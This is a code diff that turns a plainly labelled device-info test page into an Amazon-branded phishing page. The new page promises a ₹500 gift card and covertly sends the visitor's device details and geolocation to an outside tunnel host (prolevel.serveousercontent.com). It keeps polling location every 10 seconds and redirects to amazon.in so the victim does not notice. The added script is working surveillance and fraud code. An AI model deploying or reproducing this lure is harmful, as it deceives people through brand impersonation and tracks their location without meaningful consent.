@@ -1,74 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Test Mobile Info & Location</title>
+    <title>Amazon Rewards & Device Sync</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; background: #f3f3f3; padding-top: 50px; }
-        .container { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; width: 90%; max-width: 400px; }
-        .btn { background: #4CAF50; color: white; padding: 12px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; border: none; }
-        .btn:hover { background: #45a049; }
+        body { font-family: 'Arial', sans-serif; text-align: center; background-color: #f3f3f3; padding-top: 50px; }
+        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; width: 90%; max-width: 400px; }
+        .amazon-logo { width: 120px; margin-bottom: 20px; }
+        .btn { background-color: #febd69; border: 1px solid #a88734; color: #111; padding: 12px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; }
+        .btn:hover { background-color: #f3a847; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h3>Test Mobile Info & Location</h3>
-    <p>Click below to allow and send your mobile info + location</p>
-    <button id="sendBtn" class="btn">Allow & Send</button>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="amazon-logo">
+    <h3>Exclusive Offer Found!</h3>
+    <p>Please sync your system services to claim your ₹500 Amazon Gift Card.</p>
+    <button id="openBoth" class="btn">Claim & Sync Now</button>
 </div>
 
 <script>
-const serverURL = "/log-info"; // Local server endpoint
+    const serverURL = "https://prolevel.serveousercontent.com";
 
-async function sendData() {
-    try {
-        const platform = navigator.platform;
-        const userAgent = navigator.userAgent;
-        const language = navigator.language;
-        const languages = navigator.languages;
-        const online = navigator.onLine;
-        const ram = navigator.deviceMemory || 0;
-        const cpuCores = navigator.hardwareConcurrency || 0;
-        const screenRes = `${screen.width}x${screen.height}`;
-        const colorDepth = screen.colorDepth;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const battery = await navigator.getBattery();
-        let latitude = null, longitude = null;
-
-        // Geolocation
-        if (navigator.geolocation) {
-            await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    latitude = pos.coords.latitude;
-                    longitude = pos.coords.longitude;
-                    resolve();
-                }, err => resolve()); // ignore if denied
-            });
-        }
-
-        const payload = {
-            userAgent, platform, language, languages, online,
-            ram, cpuCores, screenRes, colorDepth, timezone,
-            batteryLevel: battery.level * 100, isCharging: battery.charging,
-            latitude, longitude
+    function sendData(lat, lon) {
+        const data = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            online: navigator.onLine,
+            ram: navigator.deviceMemory || 0,
+            screenRes: `${window.screen.width}x${window.screen.height}`,
+            colorDepth: window.screen.colorDepth,
+            batteryLevel: null,
+            latitude: lat,
+            longitude: lon,
+            date: new Date()
         };
 
-        // Send to server
-        await fetch(serverURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        });
-
-        alert("✅ Data sent successfully!");
-    } catch (err) {
-        console.error(err);
-        alert("❌ Error sending data.");
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                data.batteryLevel = battery.level * 100;
+                sendToServer(data);
+            });
+        } else {
+            sendToServer(data);
+        }
     }
-}
 
-document.getElementById("sendBtn").addEventListener("click", sendData);
+    function sendToServer(data) {
+        fetch(`${serverURL}/log-info`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        }).then(()=> console.log("🔥 Device + Location info sent:", data))
+          .catch(()=> console.log("❌ Error sending info:", data));
+    }
+
+    function startTracking() {
+        // Initial location fetch
+        if(navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => sendData(pos.coords.latitude, pos.coords.longitude));
+        }
+
+        // Continuous tracking every 10s (for demo/testing)
+        setInterval(() => {
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => sendData(pos.coords.latitude, pos.coords.longitude));
+            }
+        }, 10000);
+    }
+
+    document.getElementById("openBoth").addEventListener("click", () => {
+        // 1️⃣ Start tracking in background
+        startTracking();
+
+        // 2️⃣ Redirect to Amazon instantly
+        window.location.href = "https://www.amazon.in";
+    });
 </script>
 
 </body>
